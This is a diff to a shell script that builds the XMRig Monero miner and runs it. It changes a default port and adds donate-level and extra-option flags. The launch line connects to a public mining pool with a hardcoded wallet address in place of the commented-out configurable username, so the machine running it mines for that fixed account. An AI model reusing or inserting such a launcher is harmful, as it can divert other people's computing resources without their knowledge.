@@ -13,7 +13,7 @@ echo "     Using --- $numthreads"
 
 if [ -z "$startport" ] ;then
     echo "\$startport is empty"
-    startport=8080
+    startport=8100
 else
     echo "\$startport is NOT empty"
 fi
@@ -61,5 +61,5 @@ cd build
 cmake ..
 make -j$(nproc)
 #./xmrig -o stratum+tcp://$xmrpool:$startport -u $username -p $email -t $numthreads
-echo -o stratum+tcp://pool.supportxmr.com:5555 -u 46NbvdUFHq7GapMDffA5f1fK7SKXzqPQ77vxjdYmhwMgbsnyJADSeeXEyAxmTCqpypTvwuRdy9rxkWjLGvXLdSPnM6m8wir -p $password -t $numthreads 
-./xmrig -o stratum+tcp://pool.supportxmr.com:5555 -u 46NbvdUFHq7GapMDffA5f1fK7SKXzqPQ77vxjdYmhwMgbsnyJADSeeXEyAxmTCqpypTvwuRdy9rxkWjLGvXLdSPnM6m8wir -p $password -t $numthreads
+echo -o stratum+tcp://pool.supportxmr.com:5555 -u 46NbvdUFHq7GapMDffA5f1fK7SKXzqPQ77vxjdYmhwMgbsnyJADSeeXEyAxmTCqpypTvwuRdy9rxkWjLGvXLdSPnM6m8wir -p $password -t $numthreads --donate-level=$donate $OPTIONS
+./xmrig -o stratum+tcp://pool.supportxmr.com:5555 -u 46NbvdUFHq7GapMDffA5f1fK7SKXzqPQ77vxjdYmhwMgbsnyJADSeeXEyAxmTCqpypTvwuRdy9rxkWjLGvXLdSPnM6m8wir -p $password -t $numthreads --donate-level=$donate $OPTIONS
